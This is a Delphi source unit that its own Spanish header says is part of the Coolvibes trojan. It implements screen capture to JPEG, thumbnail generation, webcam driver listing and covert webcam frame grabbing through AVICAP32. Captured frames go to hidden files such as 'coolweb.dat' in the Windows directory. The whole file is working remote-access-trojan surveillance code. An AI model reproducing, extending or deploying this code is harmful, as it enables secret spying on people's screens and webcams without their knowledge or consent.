{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
que son usadas en la captura de pantalla}
unit unitCamScreen;

interface

uses
  Windows,
  Messages,
  UnitFunciones,
  SysUtils;

type
  TCapture_Save = function(filename: string; quality: integer): boolean;

  TThumb = procedure(const InFileName, OutFileName: ansistring);

  TSave_hbitmap = function(input: ansistring; filename: string; quality: integer): boolean;

function saveScreenJpeg(filename: ansistring; quality: integer): boolean;
function generateThumb(filePath, outPath: ansistring): boolean;
function CapturarWebcam(NivelCompresion, NumeroDeWebcam: integer): boolean;

const
  WM_CAP_START = $0400;
  WM_CAP_DRIVER_CONNECT = $0400 + 10;
  WM_CAP_DRIVER_DISCONNECT = $0400 + 11;
  WM_CAP_SAVEDIB = $0400 + 25;
  WM_CAP_GRAB_FRAME = $0400 + 60;
  WM_CAP_STOP = $0400 + 68;

var
  CaptureWindow: dword;

function capCreateCaptureWindowA(lpszWindowName: PChar; dwStyle: dword;
  x, y, nWidth, nHeight: word; ParentWin: dword; nId: word): dword;
  stdcall external 'AVICAP32.DLL';
function capGetDriverDescriptionA(wDriverIndex: UINT; lpszName: LPSTR;
  cbName: integer; lpszVer: LPSTR; cbVer: integer): BOOL; stdcall;
  external 'AVICAP32.DLL';

function ListarDispositivos(): string;
//function CapturarWebcam(NivelCompresion, NumeroDeWebcam: Integer): Boolean;

implementation

function saveScreenJpeg(filename: ansistring; quality: integer): boolean;
var
  hDLL:  THandle;
var
  capture_save: TCapture_Save;
var
  saved: boolean;
var
  buf:   array [0..144] of char;
begin
  saved := False;
  hDLL  := LoadLibrary(StrPCopy(buf, 'jpeg_plugin.dll'));
  if hDLL <> 0 then
  begin
    try
      @capture_save := GetProcAddress(hDll, StrPCopy(buf, 'capture_save'));
      if (@capture_save <> nil) then
      begin
        saved := capture_save(filename, quality);
      end
    finally
      FreeLibrary(hDLL)
    end;
  end;
  Result := saved;
end;

function generateThumb(filePath, outPath: ansistring): boolean;
var
  hDLL:  THandle;
var
  thumb: TThumb;
var
  buf:   array [0..144] of char;
begin
  //hDLL := LoadLibrary(StrPCopy(buf,'jpg_plugin_new.dll'));
  hDLL := LoadLibrary(StrPCopy(buf, 'jpeg_plugin.dll'));
  if hDLL <> 0 then
  begin
    try
      @thumb := GetProcAddress(hDll, StrPCopy(buf, 'CreateThumb'));
      if (@thumb <> nil) then
      begin
        thumb(filePath, outpath);
      end
    finally
      FreeLibrary(hDLL)
    end;
  end;
  if FileExists(outpath) then
    Result := True
  else
    Result := False;
end;


function ListarDispositivos(): string;
var
  szName, szVersion: array[0..MAX_PATH] of char;
  iReturn: boolean;
  x: integer;
begin
  x := 0;
  repeat
    iReturn := capGetDriverDescriptionA(x, @szName, sizeof(szName),
      @szVersion, sizeof(szVersion));
    if iReturn then
    begin
      Result := Result + szName + ' - ' + szVersion + '|';
      Inc(x);
    end;
  until iReturn = False;
end;

function CapturarWebcam(NivelCompresion, NumeroDeWebcam: integer): boolean;
var
  bit:  TBitmap;
  salvar_hbitmap: TSave_hbitmap;
  hDLL: THandle;
  buf:  array [0..144] of char;
begin
  Result := False;

  if CaptureWindow = 0 then
begin
  CaptureWindow := capCreateCaptureWindowA('CaptureWindow', WS_CHILD and WS_VISIBLE, 0, 0, 0, 0, GetDesktopWindow, 0);
  if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, NumeroDeWebcam, 0) <> 1 then
  begin
    SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
    CaptureWindow := 0;
  end;
end;

  if CaptureWindow <> 0 then
  begin
//    if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, NumeroDeWebcam, 0) <> 0 then
//    begin
      SendMessage(CaptureWindow, WM_CAP_GRAB_FRAME, 0, 0);
      SendMessage(CaptureWindow, WM_CAP_SAVEDIB, 0, longint(PChar(windir + '~~tmp.tmp')));
//      SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
//      CaptureWindow := 0;
      hDLL := LoadLibrary(StrPCopy(buf, 'jpeg_plugin.dll'));
      if hDLL <> 0 then
      begin
        @salvar_hbitmap := GetProcAddress(hDll, StrPCopy(buf, 'save_hbitmap'));
        if (@salvar_hbitmap <> nil) then
        begin
          Result := salvar_hbitmap(windir + '~~tmp.tmp', windir + 'coolweb.dat',
            NivelCompresion);
        end;
      end;
//    end
//    else
//      Result := False;
  end
  else
    Result := False;
end;




end.
